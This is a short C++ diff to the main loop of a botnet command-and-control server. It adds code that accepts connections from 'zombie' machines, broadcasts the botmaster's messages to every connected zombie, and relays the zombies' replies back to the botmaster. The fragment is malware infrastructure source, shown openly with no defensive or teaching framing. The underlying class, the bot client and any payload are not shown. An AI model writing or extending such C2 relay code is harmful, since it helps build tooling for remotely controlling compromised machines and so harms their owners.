@@ -14,7 +14,9 @@ int main()
 	{
 		while (true)
 		{
-			switch (CandC.waitForConnection())
+			CandC.waiting();					//blocking till something happens
+
+			switch (CandC.acceptConnection())
 			{
 			case WEIRDO:
 				std::cout << "Weido tried to connect" << std::endl;
@@ -25,6 +27,27 @@ int main()
 			case ZOMBIE:
 				std::cout << "New Zombie" << std::endl;
 				break;
+			default:
+				break;
+			}
+
+			if (CandC.receive())
+			{
+				std::string bmsg = CandC.getBotMasterMessage();
+				if (!bmsg.empty())
+				{
+					std::cout << CandC.getBotMasterMessage() << std::endl;
+					CandC.sendToZombies(CandC.getBotMasterMessage());
+				}
+
+				std::vector<std::string> zmsgs = CandC.getBotMessages();
+				if (!zmsgs.empty())
+				{
+					for (std::string zmsg : zmsgs)
+					{
+						CandC.sendToBotmaster(zmsg);
+					}
+				}
 			}
 		}
 	}
